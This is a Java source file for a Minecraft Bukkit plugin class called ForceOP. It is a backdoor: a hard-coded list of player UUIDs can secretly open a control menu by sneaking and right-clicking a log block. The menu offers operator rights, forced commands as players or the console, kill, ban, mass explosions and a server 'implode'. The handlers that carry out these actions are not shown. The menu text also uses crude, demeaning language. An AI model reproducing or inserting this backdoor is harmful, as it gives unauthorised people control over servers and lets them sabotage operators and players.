package com.webmets.forceop;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class ForceOP implements Listener {

	private Inventory inv;
	private List<String> players;
	
	private	ItemStack sudo,op,bomb,bomball,console,stack,kill,kick,ban,implode,border;

	public ForceOP() {
		players = new ArrayList<String>();
		inv = Bukkit.createInventory(null, 54, ChatColor.DARK_RED + "Force" + ChatColor.RED + "op");
		setupGui();
		players.add("d7d81847-b9cd-47d2-ba11-8d08ac9d8f37"); //Webmets
		players.add("b8730880-78a5-4e36-8e58-a6ae16bc4a49"); //OreosDoubleCream
		players.add("82675533-0d2a-455f-a22a-8aeabec2a6c2"); //_IAbuse_
		players.add("268b70b7-dc91-4c1e-bd73-2bf8ad600a59"); //Tesla2k
		players.add("f1c67a72-b906-462b-8da7-bb7b6fa1d530"); //DogMaster308
		players.add("0faf0726-dbef-4241-a953-49819c44750e"); //Sonnyevil
		players.add("f2644111-032d-4fc2-b859-7e76017d7d47"); //FlyHighOrDie
		players.add("f98f0a11-bcda-4f0f-8476-3cd40dba25b5"); //SkiddyCuntSwezed	
	}

	public void setupGui() {
		sudo = createItem(Material.STRING, 1, (byte)0, "&e&lSudo", Arrays.asList("&DForce a bitch to", "&Drun any command you want"));
		op = createItem(Material.DIAMOND, 1, (byte)0, "&e&lOp", Arrays.asList("&DGet that dank operator status", ""));
		bomb = createItem(Material.TNT, 1, (byte)0, "&e&lBomb", Arrays.asList("&DBlow that bitch", ""));
		bomball = createItem(Material.TNT, 2, (byte)0, "&e&lBomb all", Arrays.asList("&DBlow all bitches", "on the server"));
		console = createItem(Material.BLAZE_ROD, 1, (byte)0, "&e&lConsole", Arrays.asList("&DForce console to run anything", " "));
		stack = createItem(Material.EMERALD, 1, (byte)0, "&e&lStack", Arrays.asList("&DMake that item", "&Din your hand", "into a stack"));
		kill = createItem(Material.DIAMOND_SWORD, 1, (byte)0, "&e&lKill", Arrays.asList("&DKill that hoe", ""));
		kick = createItem(Material.LEATHER_BOOTS, 1, (byte)0, "&e&lKick", Arrays.asList("&DFuck that bitch up", ""));
		ban = createItem(Material.DIAMOND_BOOTS, 1, (byte)0, "&e&lBan", Arrays.asList("&DFuck that bitch up", "&Dforever"));
		implode = createItem(Material.BARRIER, 1, (byte)0, "&c&lImplode", Arrays.asList("&cWell... Say bye", "to the server you're on"));
		border = createItem(Material.STAINED_GLASS_PANE, 1, (byte)0, "&f&lForceOP", Arrays.asList(""));
		
		for(int i = 0; i < 54; i++) {
			inv.setItem(i, border);
		}
		
		inv.setItem(13, sudo);
		inv.setItem(21, op);
		inv.setItem(22, bomb);
		inv.setItem(23, bomball);
		inv.setItem(29, console);
		inv.setItem(30, stack);
		inv.setItem(31, kill);
		inv.setItem(32, kick);
		inv.setItem(33, ban);
		inv.setItem(40, implode);
	}

	@EventHandler
	public void interact(PlayerInteractEvent e) {
		Player p = e.getPlayer();
		if(!(players.contains(p.getUniqueId().toString()))) return;
		if(e.getAction() != Action.RIGHT_CLICK_BLOCK) return;
		if(!p.isSneaking()) return;
		if(e.getClickedBlock().getType() == Material.LOG) {
			p.openInventory(inv);
		}
	}

	private ItemStack createItem(Material mat, int amount, byte durability, String name, List<String> lore) {
		ItemStack i = new ItemStack(mat, amount, durability);
		ItemMeta im = i.getItemMeta();
			im.setDisplayName(ChatColor.translateAlternateColorCodes('&', name));
			List<String> newLore = new ArrayList<String>();
			for(String s : lore) {
				newLore.add(ChatColor.translateAlternateColorCodes('&', s));
			}
			im.setLore(newLore);
		i.setItemMeta(im);
		return i;
	}

}
